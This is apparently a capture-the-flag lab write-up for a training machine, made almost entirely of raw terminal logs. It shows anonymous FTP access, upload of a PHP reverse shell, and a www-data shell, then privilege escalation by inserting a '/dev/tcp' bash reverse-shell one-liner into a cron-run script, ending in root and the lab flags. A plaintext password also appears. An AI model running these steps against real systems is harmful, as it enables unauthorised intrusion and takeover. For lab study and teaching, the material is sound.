***Nmap scan open port***

```
nmap -sV 10.49.151.181    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 16:43 -0400
Nmap scan report for 10.49.151.181
Host is up (0.088s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.78 seconds

```


***ftp login and file downloads***


```
ftp 10.49.151.181 
Connected to 10.49.151.181.
220 (vsFTPd 3.0.3)
Name (10.49.151.181:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||51369|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> mget .test.log
mget .test.log [anpqy?]? y
229 Entering Extended Passive Mode (|||14755|)
150 Opening BINARY mode data connection for .test.log (5 bytes).
100% |*****************************************************************************************************************|     5       46.94 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes received in 00:00 (0.05 KiB/s)
ftp> mget important.jpg
mget important.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||39658|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |*****************************************************************************************************************|   245 KiB  736.52 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:00 (596.75 KiB/s)
ftp> mget notice.txt
mget notice.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||44477|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |*****************************************************************************************************************|   208      200.12 KiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (2.55 KiB/s)
ftp> 

```


```
cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

```

***upload php-reverse-shell.php ftp port***

```
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||38641|)
150 Ok to send data.
100% |*****************************************************************************************************************|  5497        6.22 MiB/s    00:00 ETA
226 Transfer complete.
5497 bytes sent in 00:00 (54.10 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||29173|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Jun 10 21:30 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rwxrwxr-x    1 112      118          5497 Jun 10 21:30 php-reverse-shell.php
226 Directory send OK.
ftp> 

```


```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt -u http://10.49.151.181/
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.151.181/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              /usr/share/wordlists/dirb/extensions_common.txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.htaccess./usr/share/wordlists/dirb/extensions_common.txt (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htpasswd./usr/share/wordlists/dirb/extensions_common.txt (Status: 403) [Size: 278]
files                (Status: 301) [Size: 314] [--> http://10.49.151.181/files/]
server-status        (Status: 403) [Size: 278]
Progress: 40938 / 40938 (100.00%)

```


```
nc -nvlp 4444             
listening on [any] 4444 ...
connect to [192.168.144.82] from (UNKNOWN) [10.49.151.181] 34644
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:32:26 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ /bin/bash
pwd
/
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/$ export TERM=xterm
export TERM=xterm
www-data@startup:/$ ^Z
zsh: suspended  nc -nvlp 4444

```


```
ssh pass:c4ntg3t3n0ughsp1c3
```


```
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

17:40:21 up 20 min, 1 user, load average: 0.00, 0.03, 0.12

USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT

vagrant pts/0 10.0.2.2 17:21 1:09 0.54s 0.54s -bash

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off

$

ls

  

bin

boot

data

dev

etc

home

incidents

initrd.img

initrd.img.old

lib

lib64

lost+found

media

mnt

opt

proc

recipe.txt

root

run

sbin

snap

srv

sys

tmp

usr

vagrant

var

vmlinuz

vmlinuz.old

$

ls -la

  

total 96

drwxr-xr-x 26 root root 4096 Oct 2 17:24 .

drwxr-xr-x 26 root root 4096 Oct 2 17:24 ..

drwxr-xr-x 2 root root 4096 Sep 25 08:12 bin

drwxr-xr-x 3 root root 4096 Sep 25 08:12 boot

drwxr-xr-x 1 vagrant vagrant 140 Oct 2 17:24 data

drwxr-xr-x 16 root root 3620 Oct 2 17:20 dev

drwxr-xr-x 95 root root 4096 Oct 2 17:24 etc

drwxr-xr-x 4 root root 4096 Oct 2 17:26 home

drwxr-xr-x 2 www-data www-data 4096 Oct 2 17:24 incidents

lrwxrwxrwx 1 root root 33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic

lrwxrwxrwx 1 root root 33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic

drwxr-xr-x 22 root root 4096 Sep 25 08:22 lib

drwxr-xr-x 2 root root 4096 Sep 25 08:10 lib64

drwx------ 2 root root 16384 Sep 25 08:12 lost+found

drwxr-xr-x 2 root root 4096 Sep 25 08:09 media

drwxr-xr-x 2 root root 4096 Sep 25 08:09 mnt

drwxr-xr-x 2 root root 4096 Sep 25 08:09 opt

dr-xr-xr-x 125 root root 0 Oct 2 17:19 proc

-rw-r--r-- 1 www-data www-data 136 Oct 2 17:24 recipe.txt

drwx------ 3 root root 4096 Oct 2 17:24 root

drwxr-xr-x 25 root root 960 Oct 2 17:23 run

drwxr-xr-x 2 root root 4096 Sep 25 08:22 sbin

drwxr-xr-x 2 root root 4096 Oct 2 17:20 snap

drwxr-xr-x 3 root root 4096 Oct 2 17:23 srv

dr-xr-xr-x 13 root root 0 Oct 2 17:19 sys

drwxrwxrwt 7 root root 4096 Oct 2 17:40 tmp

drwxr-xr-x 10 root root 4096 Sep 25 08:09 usr

drwxr-xr-x 1 vagrant vagrant 118 Oct 1 19:49 vagrant

drwxr-xr-x 14 root root 4096 Oct 2 17:23 var

lrwxrwxrwx 1 root root 30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic

lrwxrwxrwx 1 root root 30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic

$

whoami

  

www-data

$

python -c "import pty;pty.spawn('/bin/bash')"

  

www-data@startup:/$

cd

  

cd

bash: cd: HOME not set

www-data@startup:/$

ls

  

ls

bin etc initrd.img.old media recipe.txt snap usr vmlinuz.old

boot home lib mnt root srv vagrant

data incidents lib64 opt run sys var

dev initrd.img lost+found proc sbin tmp vmlinuz

www-data@startup:/$

cd home

  

cd home

www-data@startup:/home$

cd lennie

  

cd lennie

bash: cd: lennie: Permission denied

www-data@startup:/home$

ls

  

ls

lennie

www-data@startup:/home$

cd lennie

  

cd lennie

bash: cd: lennie: Permission denied

www-data@startup:/home$

sudo -l

  

sudo -l

[sudo] password for www-data:

c4ntg3t3n0ughsp1c3

  

  

Sorry, try again.

[sudo] password for www-data:

  

  

  

Sorry, try again.

[sudo] password for www-data:

c4ntg3t3n0ughsp1c3

  

  

sudo: 3 incorrect password attempts

www-data@startup:/home$

cat /etc/passwd

  

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false

systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false

systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false

systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false

syslog:x:104:108::/home/syslog:/bin/false

_apt:x:105:65534::/nonexistent:/bin/false

lxd:x:106:65534::/var/lib/lxd/:/bin/false

messagebus:x:107:111::/var/run/dbus:/bin/false

uuidd:x:108:112::/run/uuidd:/bin/false

dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false

sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin

pollinate:x:111:1::/var/cache/pollinate:/bin/false

vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash

ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false

lennie:x:1002:1002::/home/lennie:

ftpsecure:x:1003:1003::/home/ftpsecure:

www-data@startup:/home$

exit

  

exit

exit

$

exit
```


```

ssh lennie@10.49.186.92  
The authenticity of host '10.49.186.92 (10.49.186.92)' can't be established.
ED25519 key fingerprint is: SHA256:v4Yk83aT8xnOB+pdfmlLuJY1ztw/bXsFd1cl/xV07xY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.186.92' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lennie@10.49.186.92's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ python3 -c "import pty;pty.spawn('/bin/bash')"
lennie@startup:~$ ls -la
total 24
drwx------ 5 lennie lennie 4096 Jun 10 22:17 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwx------ 2 lennie lennie 4096 Jun 10 22:17 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
lennie@startup:~$ cat planner.sh
cat: planner.sh: No such file or directory
lennie@startup:~$ cd scripts
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
lennie@startup:~/scripts$ crontab -l
no crontab for lennie
lennie@startup:~/scripts$ nano /etc/print.sh

```

***bash shell***

```
sh -i >& /dev/tcp/192.168.128.61/4444 0>&1
```


```
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.128.61] from (UNKNOWN) [10.49.186.92] 60490
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
root.txt
# cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
# cat /recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
# ls -la
total 28
drwx------  4 root root 4096 Nov 12  2020 .
drwxr-xr-x 25 root root 4096 Jun 10 21:51 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Nov 12  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Nov 12  2020 root.txt
drwx------  2 root root 4096 Nov 12  2020 .ssh
# ls
root.txt
# pwd
/root
# 

```




